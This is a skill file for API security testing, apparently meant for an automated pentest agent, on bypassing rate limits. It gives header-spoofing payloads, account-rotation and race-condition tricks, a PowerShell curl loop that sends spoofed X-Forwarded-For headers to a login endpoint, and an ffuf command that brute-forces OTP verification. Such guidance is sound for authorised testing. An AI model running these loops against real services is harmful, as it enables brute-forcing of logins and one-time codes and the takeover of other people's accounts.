---
name: rate-limit
description: API rate-limit bypass (API4 / API8) — header spoofing, IP rotation, parameter tricks, and functional rate-limit gaps (login, OTP, signup, referrals, scraping). Use when an API has per-IP or per-account throttling that can be bypassed.
category: api
---

# Rate Limit Bypass

## Detection
- Identify throttled endpoints: login, OTP send/verify, signup, referrals, search/scrape, report submission, coupon redemption.
- Determine limit key: IP, account, session, User-Agent, or none (functional gap).

## Exploitation
1. **Header spoofing** (server trusts proxy headers):
   `X-Forwarded-For: 1.2.3.4`, `X-Real-IP`, `X-Client-IP`, `CF-Connecting-IP`, `Forwarded: for=`.
2. **Parameter/IP tricks**: append `.`, space, `%00` to IP; use IPv6 vs IPv4; mobile/desktop UAs.
3. **Account rotation**: create many accounts (if allowed) to reset per-account counters.
4. **Functional gaps**: limits only on one code path (OTP resend limited but verify not), counter reset on success, limits per-minute only (crawl slowly), race the counter (parallel requests before count increments).
5. **Cache/cookie bypass**: counter keyed on session cookie → delete cookie each attempt.

## Payloads
```
X-Forwarded-For: <random>
X-Client-IP: <random>
X-Real-IP: <random>
User-Agent: random-per-request
```

## Tool Commands (Windows)
```powershell
# iterate spoofed IPs with curl
1..50 | ForEach-Object {
    $ip = "10.0.$(Get-Random -Maximum 255).$(Get-Random -Maximum 255)"
    $code = curl.exe -s -o NUL -w "%{http_code}" "$U/login" -H "X-Forwarded-For: $ip" -X POST -d 'u=a&p=b'
    Write-Host "$_ $code"
}

# via ffuf with random IP header (if ffuf available)
# ffuf -w rockyou.txt -u "$U/otp/verify" -X POST -d '{"code":"FUZZ"}' -H "X-Forwarded-For: FUZZ" -mc 200
```

## Verification & Evidence
- Show limit reset/bypassed: N+ consecutive successful attempts past the throttle, or throttle not applied.
- Pair with a second impact (brute force / scraping / spam) for severity.